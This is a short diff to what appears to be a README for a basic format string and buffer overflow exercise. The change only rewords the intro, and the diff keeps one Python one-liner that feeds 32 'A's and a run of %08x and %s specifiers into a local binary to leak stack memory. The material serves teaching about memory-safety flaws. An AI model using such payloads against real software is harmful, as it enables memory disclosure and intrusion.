@@ -1,5 +1,6 @@
-Basic format string attack and buffer overflow
-However, this will work differently depending on the OS because of the way the compiler assigns values to the stack.
+This is a basic format string attack and buffer overflow.
+However, this will work differently depending on the OS because of the way the
+compiler assigns values to the stack.
 
 On Macs:
 python -c "print 'A'*32 + '%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%s'" | ./a.out
